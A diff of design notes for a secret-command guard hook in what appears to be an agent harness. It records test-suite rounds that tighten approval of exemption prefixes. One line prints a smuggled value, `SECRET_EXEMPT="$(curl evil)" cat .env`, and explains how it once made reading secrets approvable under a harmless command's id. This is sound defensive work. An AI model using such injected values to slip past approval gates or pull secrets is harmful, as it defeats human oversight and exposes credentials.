@@ -938,7 +938,7 @@ may claim otherwise.
 
       **CORRECTION:** as of this round, the allowlist below refuses the `$( )` form
       first and deliberately -- before the multi-segment check ever runs -- so the
-      refusal is no longer an accident (a suite assertion in this same commit pins
+      refusal is no longer an accident (a suite assertion in `f39546f` pins
       that: "ROUND 7: a `$( )` form is unapprovable for the SAME reason, not by
       accident"). The paragraph above is kept as the historical record of why the fix
       was needed, not as a description of the current behaviour.
@@ -954,10 +954,65 @@ may claim otherwise.
       (`SECRET_EXEMPT='a b'`) is refused too, not just a malformed one -- two existing
       suite controls asserting such reasons "still strip cleanly" (true for the hash,
       but no longer true for approvability) were inverted rather than left green and
-      silently contradicted by the new assertions. `hooks/secret-command-guard.test.sh`
-      grew from 149 passed / 0 failed to 160 passed / 0 failed; deleting the new check
-      alone reproduces exactly the same 10 assertions failing (150 passed / 10 failed) as
-      the pre-fix RED run, confirming the check is what discriminates.
+      silently contradicted by the new assertions. As of this round (`f39546f`),
+      `hooks/secret-command-guard.test.sh` grew from 149 passed / 0 failed to 160 passed /
+      0 failed; deleting the new check alone reproduces exactly the same 10 assertions
+      failing (150 passed / 10 failed) as the pre-fix RED run, confirming the check is
+      what discriminates. Two rounds later the suite stands at 161 passed / 0 failed --
+      see the round-8/9 note below task 13 for the current count.
+
+      **Round 8 (`cbee532`, 2026-08-31): the round-7 deny message was unusable, and two
+      comments still called the `$( )` refusal an accident after it had become
+      deliberate.** The printed re-run line now states the plain-word constraint
+      directly, and the follow-on advice ("seek approval for the plain command without
+      the redirection or wrapper word") was genericised to defer to whichever reason the
+      deny message names above it, instead of naming only two of what are now three
+      possible causes. Four present-tense sentences describing the `$( )` refusal as
+      accidental -- two in `hooks/lib/secret_approval.py`, two in this file -- were
+      corrected to past tense in place, with the original wording kept rather than
+      deleted. The two round-7 assertions pinning the `_EXEMPT_PREFIX_VALUE_RE` /
+      `_EXEMPT_PREFIX_RE` lockstep (the single- and double-quoted reason-with-a-space
+      cases) were marked STRUCTURAL: they are the only assertions that catch the two
+      regexes drifting apart. Re-measured at HEAD by dropping the double-quote
+      alternative from `_EXEMPT_PREFIX_VALUE_RE` alone: the suite drops to 160 passed / 1
+      failed (the double-quoted case is the sole failure), and with that drift in place
+      `SECRET_EXEMPT="$(curl evil)" cat .env` becomes approvable again with the same id as
+      `cat .env` -- the round-6 escape, reopened.
+
+      **Round 9 (`591f865`, 2026-08-31): the round-8 reword left two other quotations of
+      the deleted boilerplate line in the present tense, and the printed charset was
+      still an unpinned prose copy.** `cbee532` reworded the follow-on advice and dropped
+      the word "redirect" from it, but a `hooks/secret-command-guard.test.sh` comment and
+      this file still described the old line in the present tense and claimed it still
+      contained "redirect" -- both put into the past tense. One new assertion in
+      `hooks/secret-command-guard.test.sh` derives the printed re-run line's charset from
+      `_EXEMPT_VALUE_ALLOWED_RE` at runtime instead of hardcoding a second copy, so a
+      future edit to the regex turns the assertion red instead of leaving it to agree
+      with whatever the printed line happens to say. Re-measured at HEAD: widening the
+      regex by one character drops the suite to 160 passed / 1 failed, the single failure
+      being this assertion; a purely cosmetic reordering of the same character set (no
+      character added or removed) reddens the same single assertion the same way -- the
+      assertion pins punctuation ORDER, not just the set.
+
+      **Known limits carried forward, deliberately deferred, not fixed by round 8 or
+      9:** nine locations in the codebase describe this exact charset, either as the
+      "letters, digits, . _ , : / -" prose or as a literal quote of the regex --
+      `hooks/secret-command-guard.sh:176` (the printed message); four in
+      `hooks/lib/secret_approval.py` (two historical comments, one comment directly above
+      the check, and the deny message returned by `unapprovable_reason()`); two in
+      `hooks/secret-command-guard.test.sh` (the comment above the new assertion, and one
+      further down in the `$( )` test block); one in `rules/gates.md`; and one in this
+      file, quoting the regex literal. The round-9 assertion pins exactly one of these
+      nine (`hooks/secret-command-guard.sh:176`, via its printed output); the other eight
+      remain unpinned, one of them user-facing
+      (`hooks/lib/secret_approval.py`'s `unapprovable_reason()` deny message). Also
+      carried forward: for a wrapper-word refusal, the generic advice "remove what the
+      reason above names" names nothing actionable, since a wrapper refusal is not a
+      reason-character refusal -- pre-existing, not touched by round 8 or 9. And
+      `rules/gates.md` has grown by roughly 2,081 words (1,691 to 3,772, measured by
+      `wc -w` against this branch's merge-base with `main`) across this branch's rounds,
+      entirely inside the Secret-command-guard / Secret-gate-override bullet -- deferred
+      to the user as its own change, not touched here.
 
 ## Decisions taken — user-confirmed 2026-08-28
 
